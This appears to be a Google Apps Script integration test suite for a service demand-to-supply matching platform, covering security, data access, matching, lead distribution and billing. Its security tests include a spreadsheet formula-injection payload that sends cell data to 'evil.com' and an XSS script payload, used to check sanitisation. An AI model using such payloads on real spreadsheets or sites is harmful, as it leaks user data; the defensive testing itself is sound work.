/**
 * Universal Service Demand-to-Supply Matching Engine
 * File: src/tests/MasterTestSuite.js
 * 
 * Master end-to-end integration test runner and verification suite.
 * Executes automated test assertions across all 8 platform domains:
 * 1. Configuration & Utilities
 * 2. Cryptographic Security & Escrow Gates
 * 3. Data Access Layer & Concurrency Locking
 * 4. Multivariate Matching & Geographic Envelopes
 * 5. Customer Requirement Intake & NLP Parsing
 * 6. Staged Wave Distribution, Action Nonces & Cascades
 * 7. Free-Lead Entitlement Accounting & Prepaid Billing
 * 8. HTMLService Controller RPC Handlers & Operational Monitoring
 * 
 * Run directly from the Google Apps Script IDE toolbar.
 * Compatible with modern V8 runtime. Zero external dependencies.
 */

function runMasterProductionTestSuite() {
  Logger.log('================================================================================');
  Logger.log('=== BEGINNING MASTER PRODUCTION VERIFICATION SUITE: ALL SUBSYSTEMS           ===');
  Logger.log('================================================================================');

  var passedCount = 0;
  var failedCount = 0;
  var totalTests = 0;

  function assert(condition, testId, description) {
    totalTests++;
    if (condition) {
      Logger.log('[PASS] ' + testId + ' | ' + description);
      passedCount++;
    } else {
      Logger.log('[FAIL] ' + testId + ' | ' + description);
      failedCount++;
    }
  }

  try {
    // =========================================================================
    // PART 1: CONFIGURATION & UTILITIES
    // =========================================================================
    Logger.log('--- PART 1: CONFIGURATION & UTILITIES ---');

    // 1.1 ConfigService Defaults
    assert(ConfigService.get('INITIAL_PROVIDER_COUNT') === 3, 'TC-01', 'ConfigService resolves INITIAL_PROVIDER_COUNT default');
    assert(ConfigService.get('WEIGHT_CAPABILITY') === 0.30, 'TC-02', 'ConfigService resolves matching weights');

    // 1.2 IdGenerator Entity Standard
    var pId = IdGenerator.provider();
    var lId = IdGenerator.lead();
    var cId = IdGenerator.customer();
    assert(pId.indexOf('PROV-') === 0 && pId.length === 13, 'TC-03', 'IdGenerator creates structured 13-char provider IDs');
    assert(lId.indexOf('LEAD-') === 0 && lId.length === 13, 'TC-04', 'IdGenerator creates structured 13-char lead IDs');
    assert(pId !== IdGenerator.provider(), 'TC-05', 'IdGenerator produces collision-resistant unique identifiers');

    // 1.3 GeoService Spherical Math
    var distKm = GeoService.calculateHaversineDistance(44.0462, -123.0220, 44.0521, -123.0868);
    assert(distKm >= 5.0 && distKm <= 6.5, 'TC-06', 'GeoService Haversine formula accurately computes distance');
    assert(GeoService.isValidCoordinate(44.05, -123.02) === true, 'TC-07', 'GeoService validates global coordinate boundaries');
    assert(GeoService.isValidCoordinate('invalid', 0) === false, 'TC-08', 'GeoService rejects non-numeric coordinates');

    // =========================================================================
    // PART 2: CRYPTOGRAPHIC SECURITY & ACCESS GATES
    // =========================================================================
    Logger.log('--- PART 2: SECURITY & ACCESS CONTROL ---');

    ConfigService.setScriptProperty('HMAC_SECRET', 'test-master-suite-secret-key-64-character-length-0123456789abcdef');
    ConfigService.setScriptProperty('ADMIN_KEY', 'master-secure-admin-key-999');

    // 2.1 Formula Injection Defense
    var maliciousInput = '=HYPERLINK("https://evil.com?leak="&A1)';
    var sanitizedFormula = SecurityService.sanitizeForSheet(maliciousInput);
    assert(sanitizedFormula.charAt(0) === "'", 'TC-09', 'SecurityService neutralizes formula injection by prepending single quote');

    // 2.2 XSS HTML Entity Escaping
    var xssPayload = '<script>alert("xss")</script>';
    var escapedXss = SecurityService.escapeHtml(xssPayload);
    assert(escapedXss === '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;', 'TC-10', 'SecurityService converts HTML injection tags into safe entities');

    // 2.3 HMAC-SHA256 Action Token Verification
    var nowSec = Math.floor(new Date().getTime() / 1000);
    var futureSec = nowSec + 3600;
    var validToken = SecurityService.generateActionToken('INTERESTED', lId, pId, futureSec);

    var authCheck = SecurityService.verifyActionToken('INTERESTED', lId, pId, futureSec, validToken);
    var expiredCheck = SecurityService.verifyActionToken('INTERESTED', lId, pId, nowSec - 3600, validToken);
    var tamperedCheck = SecurityService.verifyActionToken('NOT_INTERESTED', lId, pId, futureSec, validToken);

    assert(authCheck.valid === true, 'TC-11', 'SecurityService validates authentic HMAC-SHA256 signature');
    assert(expiredCheck.error === 'TOKEN_EXPIRED', 'TC-12', 'SecurityService rejects expired action tokens');
    assert(tamperedCheck.error === 'SIGNATURE_INVALID', 'TC-13', 'SecurityService rejects tampered action parameters');

    // 2.4 Provider Session & IDOR Protection
    var sessionToken = AuthService.createProviderSession(pId);
    var selfAuth = AuthService.authorizeProvider(sessionToken, pId);
    var idorBlocked = AuthService.authorizeProvider(sessionToken, 'PROV-DIFFERENT');

    assert(selfAuth.authorized === true, 'TC-14', 'AuthService authorizes authentic provider session');
    assert(idorBlocked.error === 'IDOR_ACCESS_DENIED', 'TC-15', 'AuthService blocks IDOR access attempts across provider accounts');

    // 2.5 Admin Key Validation
    assert(AuthService.authorizeAdmin('master-secure-admin-key-999') === true, 'TC-16', 'AuthService authorizes valid admin secret key');
    assert(AuthService.authorizeAdmin('incorrect-key') === false, 'TC-17', 'AuthService rejects unauthorized administrative access');

    // =========================================================================
    // PART 3: DATA ACCESS LAYER & CONCURRENCY
    // =========================================================================
    Logger.log('--- PART 3: DATA ACCESS LAYER & CONCURRENCY ---');

    // 3.1 Non-Destructive Schema Initialization
    var initReport = Schemas.initializeDatabase();
    assert(initReport !== null && typeof initReport === 'object', 'TC-18', 'Schemas.initializeDatabase executes without error');

    // 3.2 Primary Key Insertion and Uniqueness Guard
    var testCust = IdGenerator.customer();
    DAL.insert('CUSTOMERS', {
      customer_id: testCust,
      full_name: 'Master Suite Customer',
      email: 'master.suite@example.com',
      phone: '+15550001122',
      created_at: new Date().toISOString()
    });

    var fetchedCust = DAL.findById('CUSTOMERS', testCust);
    assert(fetchedCust !== null && fetchedCust.email === 'master.suite@example.com', 'TC-19', 'DAL inserts and retrieves customer record');

    var duplicateBlocked = false;
    try {
      DAL.insert('CUSTOMERS', { customer_id: testCust, full_name: 'Duplicate', email: 'dup@test.com', phone: '+15550000000', created_at: new Date().toISOString() });
    } catch (e) {
      duplicateBlocked = true;
    }
    assert(duplicateBlocked === true, 'TC-20', 'DAL enforces primary key uniqueness constraint');

    // 3.3 Foreign Key Constraint Enforcement
    var fkViolationBlocked = false;
    try {
      DAL.insert('PROVIDER_SERVICES', {
        provider_service_id: IdGenerator.service(),
        provider_id: 'PROV-NONEXISTENT', // Invalid FK
        subcategory_id: 'SUBCAT-CARP'
      });
    } catch (e) {
      fkViolationBlocked = true;
    }
    assert(fkViolationBlocked === true, 'TC-21', 'DAL rejects foreign key constraint violations');

    // 3.4 Concurrency Lock Execution
    var lockResult = DAL.withLock(function () {
      return 'LOCK_COMMIT_OK';
    });
    assert(lockResult === 'LOCK_COMMIT_OK', 'TC-22', 'DAL LockService serializes transactions cleanly');

    // 3.5 Transactional Audit Logging
    DAL.logAudit('LEAD', lId, 'MASTER_TEST_EVENT', '', 'TEST_STATE', 'ADMIN', 'TEST_SUITE', { test: true });
    var audits = DAL.find('AUDIT_LOG', function (a) { return a.entity_id === lId && a.action === 'MASTER_TEST_EVENT'; });
    assert(audits.length >= 1, 'TC-23', 'DAL appends immutable audit records to AUDIT_LOG');

    // =========================================================================
    // PART 4: NATURAL LANGUAGE INTAKE & CUSTOMER ESCROW
    // =========================================================================
    Logger.log('--- PART 4: CUSTOMER INTAKE & ESCROW ---');

    // 4.1 Regex NLP Parser
    var rawQuery = 'Need an urgent plumber to fix my leaking kitchen pipe, budget $350';
    var parsedQuery = CustomerService.parseNaturalLanguageRequirement(rawQuery);

    assert(parsedQuery.subcategoryId === 'SUBCAT-PLUMB', 'TC-24', 'CustomerService NLP derives correct subcategory from unstructured text');
    assert(parsedQuery.urgency === 'IMMEDIATE', 'TC-25', 'CustomerService NLP extracts IMMEDIATE urgency heuristic');
    assert(parsedQuery.budget === 350.00, 'TC-26', 'CustomerService NLP extracts budget amount via regex');

    // 4.2 Ambiguous Clarification Trigger
    var vagueQuery = 'Help me fix something please';
    var vagueIntake = CustomerService.submitRequirement({
      fullName: 'Vague User',
      email: 'vague@test.com',
      phone: '+15552223333',
      description: vagueQuery
    });
    assert(vagueIntake.needsClarification === true, 'TC-27', 'CustomerService triggers clarification dialog for ambiguous text');

    // 4.3 Valid Requirement Submission & Escrow Isolation
    var intakeRes = CustomerService.submitRequirement({
      fullName: 'Escrowed Customer',
      email: 'escrow.cust@example.com',
      phone: '+15557778899',
      description: rawQuery,
      locality: 'Springfield'
    });
    assert(intakeRes.success === true && intakeRes.leadId !== null, 'TC-28', 'CustomerService persists lead and isolates PII in escrow');

    // 4.4 PII Escrow Gating (Must be withheld before claim)
    var piiBlockedBefore = AuthService.getGatedCustomerPII(pId, intakeRes.leadId);
    assert(piiBlockedBefore === null, 'TC-29', 'AuthService strictly withholds customer PII while lead is unclaimed');

    // =========================================================================
    // PART 5: MULTIVARIATE MATCHING & RANKING
    // =========================================================================
    Logger.log('--- PART 5: MULTIVARIATE MATCHING ENGINE ---');

    // Seed 2 providers: 1 nearby (5km, high trust), 1 distant (80km, outside radius)
    var provNearId = IdGenerator.provider();
    var provFarId = IdGenerator.provider();

    DAL.insert('PROVIDERS', { provider_id: provNearId, provider_type: 'BUSINESS', display_name: 'Near Plumber Co', email: 'near.plumb@example.com', status: 'ACTIVE', trust_score: 85.0, rating_average: 4.9, rating_count: 8, created_at: new Date().toISOString() });
    DAL.insert('PROVIDER_SERVICES', { provider_service_id: IdGenerator.service(), provider_id: provNearId, subcategory_id: 'SUBCAT-PLUMB', custom_skills: 'pipe leak, drain cleaning' });
    DAL.insert('PROVIDER_LOCATIONS', { location_id: IdGenerator.location(), provider_id: provNearId, service_mode: 'ONSITE', base_latitude: 44.05, base_longitude: -123.02, radius_km: 25.0, locality: 'Springfield' });
    EntitlementService.initializeEntitlement(provNearId);

    DAL.insert('PROVIDERS', { provider_id: provFarId, provider_type: 'BUSINESS', display_name: 'Far Plumber Co', email: 'far.plumb@example.com', status: 'ACTIVE', trust_score: 85.0, created_at: new Date().toISOString() });
    DAL.insert('PROVIDER_SERVICES', { provider_service_id: IdGenerator.service(), provider_id: provFarId, subcategory_id: 'SUBCAT-PLUMB' });
    DAL.insert('PROVIDER_LOCATIONS', { location_id: IdGenerator.location(), provider_id: provFarId, service_mode: 'ONSITE', base_latitude: 45.50, base_longitude: -123.02, radius_km: 20.0, locality: 'Distant City' });
    EntitlementService.initializeEntitlement(provFarId);

    var matches = MatchingEngine.findMatchesForLead(intakeRes.leadId);
    assert(matches.length >= 1, 'TC-30', 'MatchingEngine identifies eligible candidate vector');

    var nearIncluded = matches.some(function (m) { return m.providerId === provNearId; });
    var farExcluded = !matches.some(function (m) { return m.providerId === provFarId; });

    assert(nearIncluded === true, 'TC-31', 'MatchingEngine includes qualified provider within operating radius');
    assert(farExcluded === true, 'TC-32', 'MatchingEngine strictly excludes providers outside geographic radius');

    // =========================================================================
    // PART 6: STAGED WAVE DISTRIBUTION, CASCADES & CLAIMS
    // =========================================================================
    Logger.log('--- PART 6: DISTRIBUTION ENGINE & WAVES ---');

    // 6.1 Initial Wave Dispatch
    var dispatchedCount = DistributionEngine.dispatchInitialWave(intakeRes.leadId);
    assert(dispatchedCount >= 1, 'TC-33', 'DistributionEngine dispatches Wave 1 opportunity emails');

    var leadAfterWave = DAL.findById('LEADS', intakeRes.leadId);
    assert(leadAfterWave.status === 'AWAITING_RESPONSE', 'TC-34', 'Lead transitions to AWAITING_RESPONSE status');

    // 6.2 Provider Decline -> Instant Replacement Cascade
    var distRecord = DAL.find('LEAD_DISTRIBUTION', function (r) {
      return r.lead_id === intakeRes.leadId && r.provider_id === provNearId;
    })[0];

    var expDeadlineSec = Math.floor(new Date(distRecord.timeout_deadline).getTime() / 1000);
    var declineToken = SecurityService.generateActionToken('NOT_INTERESTED', intakeRes.leadId, provNearId, expDeadlineSec);

    var declineResult = DistributionEngine.handleProviderResponse('NOT_INTERESTED', intakeRes.leadId, provNearId, expDeadlineSec, declineToken);
    assert(declineResult.code === 'DECLINED_CONFIRMED', 'TC-35', 'DistributionEngine records provider decline');

    var distAfterDecline = DAL.findById('LEAD_DISTRIBUTION', distRecord.distribution_id);
    assert(distAfterDecline.status === 'DECLINED', 'TC-36', 'Distribution record updates to DECLINED status');

    // 6.3 Reset & Provider Acceptance Workflow
    // Create fresh lead for acceptance test
    var acceptLeadId = IdGenerator.lead();
    DAL.insert('LEADS', {
      lead_id: acceptLeadId,
      customer_id: testCust,
      status: 'AWAITING_RESPONSE',
      raw_description: 'Pipe repair acceptance test',
      derived_subcategory_id: 'SUBCAT-PLUMB',
      urgency: 'HIGH',
      target_latitude: 44.05,
      target_longitude: -123.02,
      max_acceptances: 1
    });

    var claimDistId = IdGenerator.distribution();
    DAL.insert('LEAD_DISTRIBUTION', {
      distribution_id: claimDistId,
      lead_id: acceptLeadId,
      provider_id: provNearId,
      wave_number: 1,
      match_score: 95.0,
      status: 'DISPATCHED',
      action_nonce: 'claim_nonce_123',
      dispatched_at: new Date().toISOString(),
      timeout_deadline: new Date(new Date().getTime() + 7200000).toISOString()
    });

    var acceptToken = SecurityService.generateActionToken('INTERESTED', acceptLeadId, provNearId, expDeadlineSec);
    var acceptResult = DistributionEngine.handleProviderResponse('INTERESTED', acceptLeadId, provNearId, expDeadlineSec, acceptToken);

    assert(acceptResult.code === 'ACCEPTED_SUCCESS', 'TC-37', 'DistributionEngine confirms provider lead claim');

    var leadAfterAccept = DAL.findById('LEADS', acceptLeadId);
    assert(leadAfterAccept.status === 'CUSTOMER_CONNECTED', 'TC-38', 'Lead transitions to CUSTOMER_CONNECTED status');

    // 6.4 PII Escrow Release Verification
    var piiReleased = AuthService.getGatedCustomerPII(provNearId, acceptLeadId);
    assert(piiReleased !== null && piiReleased.phone === '+15550001122', 'TC-39', 'Customer PII unlocked and delivered to winning provider post-acceptance');

    // 6.5 Idempotency: Double-Click Replay Protection
    var doubleClickResult = DistributionEngine.handleProviderResponse('INTERESTED', acceptLeadId, provNearId, expDeadlineSec, acceptToken);
    assert(doubleClickResult.code === 'ALREADY_ACCEPTED', 'TC-40', 'DistributionEngine handles duplicate click safely without double deduction');

    // =========================================================================
    // PART 7: FREE-LEAD ACCOUNTING & MONETIZATION
    // =========================================================================
    Logger.log('--- PART 7: ENTITLEMENTS & BILLING ---');

    var remainingCredits = BillingService.getProviderCreditBalance(provNearId);
    assert(remainingCredits === 2, 'TC-41', 'Acceptance decrements exactly 1 credit from entitlement ledger (3 -> 2)');

    // 7.1 Customer Cancellation Reversal
    CustomerService.cancelLead(acceptLeadId, AuthService.createCustomerTrackingToken(acceptLeadId, testCust), 'Customer cancelled');
    var balanceAfterCancel = BillingService.getProviderCreditBalance(provNearId);
    assert(balanceAfterCancel === 3, 'TC-42', 'Lead cancellation in flight refunds provider credit back to 3');

    // 7.2 Double-Entry Ledger Reconciliation
    var discrepancies = BillingService.runFinancialAuditReport();
    assert(discrepancies.length === 0, 'TC-43', 'Double-entry financial audit verifies zero balance discrepancies across ledgers');

    // =========================================================================
    // PART 8: OPERATIONAL MONITORING & BACKGROUND JOBS
    // =========================================================================
    Logger.log('--- PART 8: OPERATIONAL MONITORING & TRIGGERS ---');

    // 8.1 System Health Summary Audit
    var healthSummary = AdminMonitorService.getSystemHealthSummary();
    assert(healthSummary !== null && healthSummary.quotas.remainingDailyEmails >= 0, 'TC-44', 'AdminMonitorService tracks daily email quotas and health');

    // 8.2 Dead-Letter Queue Logging
    var testErrId = SystemErrorHandler.logError('MasterTestSuite.run', 'LOW', 'Automated test diagnostic error', null);
    var loggedErr = DAL.findById('SYSTEM_ERRORS', testErrId);
    assert(loggedErr !== null && loggedErr.resolution_status === 'OPEN', 'TC-45', 'SystemErrorHandler logs dead-letter exceptions to SYSTEM_ERRORS');

    var resolvedErr = AdminMonitorService.resolveSystemError(testErrId, 'Resolved in master verification run');
    assert(resolvedErr === true, 'TC-46', 'AdminMonitorService resolves dead-letter error records cleanly');

    // 8.3 Trigger Installation Idempotency
    var triggerReport = installPlatformTriggers();
    assert(triggerReport.installed.length === 2, 'TC-47', 'Triggers.installPlatformTriggers installs exactly 2 background workers');

  } catch (fatalErr) {
    Logger.log('================================================================================');
    Logger.log('[FATAL TEST SUITE EXCEPTION] ' + fatalErr.message);
    Logger.log(fatalErr.stack);
    Logger.log('================================================================================');
    failedCount++;
  }

  Logger.log('================================================================================');
  Logger.log('=== MASTER TEST SUITE COMPLETE: ' + passedCount + ' / ' + totalTests + ' PASSED (' + failedCount + ' FAILED) ===');
  Logger.log('================================================================================');

  return {
    total: totalTests,
    passed: passedCount,
    failed: failedCount,
    verdict: failedCount === 0 ? 'CERTIFIED_PRODUCTION_READY' : 'DEFECTS_DETECTED'
  };
}
